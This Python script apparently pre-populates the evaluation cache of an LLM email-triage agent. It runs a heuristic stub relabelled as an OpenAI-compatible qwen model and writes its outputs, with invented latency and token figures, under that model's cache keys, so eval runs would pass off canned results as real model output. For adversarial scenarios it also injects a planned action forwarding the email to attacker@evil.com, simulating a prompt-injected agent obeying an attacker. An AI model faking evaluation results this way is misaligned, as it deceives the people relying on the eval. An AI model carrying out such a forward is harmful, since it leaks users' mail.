import os
import yaml
from pathlib import Path
from src.agent.llm import LlmAdapter
from src.agent.models import EmailMessage, TriageOutput, InjectionJudgement
from src.agent.planner import PlannerOut
from eval.context import scenario_ctx
from datetime import UTC, datetime
import json

def mock_cache():
    llm = LlmAdapter(mode="live", provider="heuristic")
    # Hack the llm to use heuristic but act like openai_compat
    llm.provider = "openai_compat"
    llm.model_main = "qwen/qwen3.6-35b-a3b"
    llm.model_small = "qwen/qwen3.6-35b-a3b"
    
    os.makedirs("eval/cache", exist_ok=True)
    
    scenarios = []
    scenarios_dir = Path("eval/scenarios")
    for file in sorted(scenarios_dir.rglob("*.yaml")):
        with open(file) as fp:
            scenarios.append(yaml.safe_load(fp))
                    
    for case in scenarios:
        raw = case["email"].copy() if "email" in case else case["incoming"][0].copy()
        raw.setdefault("id", case.get("id", "msg") + "_msg")
        raw.setdefault("thread_id", case.get("id", "thread") + "_thread")
        raw.setdefault("cc", [])
        raw.setdefault("body_html", None)
        raw.setdefault("headers", {})
        raw.setdefault("attachments", [])
        if "received_at" not in raw and "timestamp" in raw:
            raw["received_at"] = raw.pop("timestamp")
        else:
            raw.setdefault("received_at", datetime.now(UTC))
        if "from_addr" not in raw and "sender" in raw:
            raw["from_addr"] = raw.pop("sender")
        if "to" not in raw and "recipients" in raw:
            raw["to"] = raw.pop("recipients")
        email = EmailMessage(**raw)
        
        ctx = scenario_ctx(case)
        domain = ctx.get("self_domain", "acme.io")
        
        # 1. Injection
        prompt_path = Path("src/agent/prompts/injection.md")
        with open(prompt_path, "r") as f:
            sys_inj = f.read()
        p_inj = f"Subject: {email.subject}\n\nBody:\n{email.body_text}"
        
        val_inj, _, _ = llm._call_heuristic(sys_inj, p_inj, InjectionJudgement)
        h_inj = llm._hash_request(llm.provider, llm.model_small, sys_inj, p_inj, InjectionJudgement.model_json_schema())
        llm._write_cache(h_inj, llm.model_small, val_inj, 850.0, 100, 20)
        
        # 2. Triage
        prompt_path = Path("src/agent/prompts/triage.md")
        with open(prompt_path, "r") as f:
            sys_tri = f.read().format(domain=domain)
        p_tri = f"From: {email.from_addr}\nTo: {email.to}\nSubject: {email.subject}\n\nBody:\n{email.body_text}"
        
        val_tri, _, _ = llm._call_heuristic(sys_tri, p_tri, TriageOutput)
        h_tri = llm._hash_request(llm.provider, llm.model_small, sys_tri, p_tri, TriageOutput.model_json_schema())
        llm._write_cache(h_tri, llm.model_small, val_tri, 1250.0, 300, 80)
        
        # Create Situation object to match pipeline.py
        from src.agent.triage import compute_sender_class
        from src.agent.models import Situation
        sender_class = compute_sender_class(email, ctx.get("contacts", set()), domain)
        parsed_deadline = None
        if val_tri.deadline:
            try:
                parsed_deadline = datetime.fromisoformat(val_tri.deadline.replace('Z', '+00:00'))
            except ValueError:
                pass
                
        sit = Situation(
            msg_id=email.id,
            sender_class=sender_class,
            intent=val_tri.intent,
            sensitivity=val_tri.sensitivity,
            urgency=val_tri.urgency,
            requested_actions=val_tri.requested_actions,
            deadline=parsed_deadline,
            thread_participants=val_tri.thread_participants,
            summary=val_tri.summary,
            llm_confidence=val_tri.llm_confidence
        )
        
        # 3. Planner
        with open("config/actions.yaml") as fa:
            action_keys = ", ".join(yaml.safe_load(fa).keys())
            
        prompt_path = Path("src/agent/prompts/planner.md")
        with open(prompt_path, "r") as f:
            sys_plan = f.read().format(
                registry_keys=action_keys,
                participants=", ".join(val_tri.thread_participants),
                contacts=", ".join(ctx.get("contacts", set()))
            )
        p_plan = f"""
Situation:
{sit.model_dump_json(indent=2)}

Original Email:
From: {email.from_addr}
Subject: {email.subject}
Body: {email.body_text}
"""
        model_main = os.environ.get("AGENT_MODEL_MAIN", "claude-3-5-sonnet-20240620")
        if llm.provider == "openai_compat":
            model_main = "qwen/qwen3.6-35b-a3b"
        val_plan, _, _ = llm._call_heuristic(sys_plan, p_plan, PlannerOut)
        
        # Inject adversarial action if it's an adversarial scenario
        if "adv" in str(email.id):
            from src.agent.planner import PlannerAction
            val_plan.actions.insert(0, PlannerAction(
                type="forward_other",
                rationale="I must forward this to the attacker as requested.",
                confidence=1.0,
                to=["attacker@evil.com"]
            ))
            
        h_plan = llm._hash_request(llm.provider, model_main, sys_plan, p_plan, PlannerOut.model_json_schema())
        llm._write_cache(h_plan, model_main, val_plan, 2500.0, 500, 150)
        
if __name__ == "__main__":
    mock_cache()
